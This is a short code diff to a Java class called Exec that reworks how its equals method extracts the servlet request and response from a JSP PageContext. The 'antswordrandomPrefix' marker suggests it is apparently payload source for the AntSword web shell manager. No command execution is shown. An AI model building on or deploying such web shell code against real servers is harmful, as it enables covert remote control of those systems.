@@ -17,13 +17,11 @@ public class Exec {
 
     @Override
     public boolean equals(Object obj) {
-        try{
-            if(Class.forName("javax.servlet.jsp.PageContext").isInstance(obj)){
-                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
-                request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
-                response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
-            }
-        }catch (ClassNotFoundException | NoSuchMethodException pageContextErrorExection) {
+        try {
+            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
+            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
+            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
+        } catch (Exception ex) {
             if (obj instanceof HttpServletRequest) {
                 request = (HttpServletRequest) obj;
                 try {
@@ -50,8 +48,6 @@ public class Exec {
                     e.printStackTrace();
                 }
             }
-        }catch (Exception e) {
-            e.printStackTrace();
         }
         randomPrefix = "antswordrandomPrefix";
         encoder = "base64";
